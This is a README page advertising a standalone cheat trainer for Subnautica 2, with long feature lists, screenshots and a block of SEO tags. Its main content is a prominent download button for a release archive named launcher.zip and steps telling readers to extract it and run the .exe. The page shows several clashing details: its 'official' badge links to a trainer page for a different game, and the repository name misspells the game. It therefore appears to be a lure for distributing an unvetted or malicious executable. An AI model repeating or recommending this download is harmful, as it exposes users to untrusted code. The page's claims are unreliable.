# Subnautica 2 Trainer - Advanced Standalone Cheat Menu & QoL Tools (Build 2026.05.18)

### 📥 **Official Resources & Download**


<a href="https://vgtimes.ru/games/crimson-desert/files/93140-trejjner-v1-1-2026-22-funkcii-upd.html" target="_blank">
    <img src="https://img.shields.io/badge/-_VGTIMES.RU-ff00aa?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=ff00aa" alt="VGTimes Page">
  </a>

<br><br>

<div align="center">
  <a href="https://github.com/alessiocasali94/Subnatica2-Inventory-and-Player-Editor/releases/download/Subnatica2/launcher.zip" target="_blank">
    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
  </a>
</div>




**Powerful standalone offline trainer for Subnautica 2 (2026)** — complete control over player stats, movement & physics, crafting & building, time & world, vehicles & tools, unique features and presets with a beautiful real-time overlay UI.

<img width="1282" height="805" alt="image" src="https://github.com/user-attachments/assets/fefa9003-e55b-4451-aa07-af894cc72937" />
<img width="1282" height="804" alt="image" src="https://github.com/user-attachments/assets/24e946fb-bc4a-4059-8b61-2cec385b2a5a" />
<img width="1279" height="801" alt="image" src="https://github.com/user-attachments/assets/2b412b81-4789-4938-a970-1f8ec56dd24e" />
<img width="1288" height="801" alt="image" src="https://github.com/user-attachments/assets/bec4b5ab-00fa-4db0-9541-b50656e13fc9" />
<img width="1281" height="801" alt="image" src="https://github.com/user-attachments/assets/95aba03c-bce5-45f1-92cb-9fcdd0a200ee" />
<img width="1280" height="798" alt="image" src="https://github.com/user-attachments/assets/9087c2d6-9929-447f-a5b8-cc7c8bdd5f97" />
<img width="1286" height="804" alt="image" src="https://github.com/user-attachments/assets/06706af1-54c3-4161-affe-ebc3be3641df" />


---
### ✨ Features
- Modern standalone trainer UI with real-time overlay
- Clean and intuitive menu with sidebar tabs
- Works only in **offline single-player mode**
- 40+ toggles, sliders and adjustable parameters
- Real-time sliders, hotkeys and INI saving

---
### 📋 Full Feature List
<details>
<summary><strong>Player Stats</strong></summary>
- Extended Health [Num1]
- Extended Oxygen [Num2]
- Oxygen Level (slider)
- Extended Food & Water
- Extended Energy / Batteries
- Radiation Shield
- Stable Temperature + Comfort thermoregulation
- Invulnerability [F1]
- Extended Stamina
</details>

<details>
<summary><strong>Movement & Physics</strong></summary>
- Walk Speed Boost
- Swim Speed Boost
- Jump Height Boost
- Aerial Movement
- Free Movement [F2]
- Gravity Control
</details>

<details>
<summary><strong>Crafting & Building</strong></summary>
- Fast Crafting
- Simple Crafting
- Fast Build Mode
- Extended Base Power
- Reveal Blueprints
- Reveal Databank Entries
</details>

<details>
<summary><strong>Time & World</strong></summary>
- Freeze Time of Day
- Simulation Speed
- Day / Night Lock
- Weather Control
- Creature Pace
</details>

<details>
<summary><strong>Vehicles & Tools</strong></summary>
- Vehicle Protection (Seamoth, Prawn, Cyclops, etc.)
- Extended Vehicle Power
- Vehicle Speed Boost
- Vehicle Maintenance
- Scanner Range Multiplier
</details>

<details>
<summary><strong>Unique / Innovative</strong></summary>
- Bioluminescence Aura
- Creature Calm (Aggression bias)
- Abyss Vision (night vision + fog + draw distance)
- Base Harmony (auto-optimize base integrity & decor)
- Echo Locator
- Time Capsule Editor (Title + Message + Screenshot note)
</details>

<details>
<summary><strong>Presets & Theme</strong></summary>
- Relaxed Explorer
- Speedrunner
- Creative Suite
- Enable ambient audio stub
- Keep window on top
- Sound (hover/activate)
</details>

---
### 🚀 How to Use
1. Download the latest release
2. Extract the archive
3. Run the trainer (.exe)
4. Launch **Subnautica 2 in offline mode**
5. The trainer UI will appear over the game

**Tip:** Use the left sidebar tabs for easy navigation. All settings are saved with the **Save INI** button.

---
### ⚠️ Important Disclaimer
- This tool is for **offline single-player use only**.
- Do not use in any online features.
- Always backup your save files before using.
- The author is not responsible for any issues with your account or game saves.

---
### 🛠️ Technical Information
- Standalone trainer with beautiful real-time overlay UI
- Built for Subnautica 2 (Build 2026.05.18 • PC/Steam)
- Supports real-time value editing, toggles and hotkeys

---
### ⭐ Support the Project
If you enjoy the trainer — please star the repository! ❤️

---
### 📌 Topics (SEO Tags)
subnautica-2-trainer subnautica-2-cheat subnautica-2-cheat-menu subnautica-2-god-mode subnautica-2-infinite-oxygen subnautica-2-extended-health subnautica-2-fast-crafting subnautica-2-vehicle-speed subnautica-2-abyss-vision subnautica-2-trainer-2026 subnautica-2-standalone-trainer subnautica-2-qol subnautica-2-invulnerability subnautica-2-free-movement subnautica-2-creative-suite subnautica-2-speedrunner subnautica-2-offline-trainer subnautica-2-movement-boost subnautica-2-crafting subnautica-2-time-control subnautica-2-vehicle-tools subnautica-2-base-harmony subnautica-2-biominescence subnautica-2-scanner-range
